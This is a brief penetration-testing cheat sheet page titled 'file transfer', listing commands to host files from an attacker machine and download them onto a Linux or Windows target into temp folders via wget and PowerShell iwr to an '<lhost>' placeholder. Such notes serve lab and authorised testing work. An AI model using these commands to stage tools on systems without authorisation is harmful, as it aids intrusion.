+++
title = "file transfer"
description = "moving things on and off a box."
weight = 4
+++

## serving files

```sh
python3 -m http.server 8000
```

```sh
impacket-smbserver share . -smb2support
```

## linux

```sh
wget http://<lhost>:8000/<file> -O /tmp/<file>
```

## windows

```powershell
iwr http://<lhost>:8000/<file> -OutFile C:\Windows\Temp\<file>
```
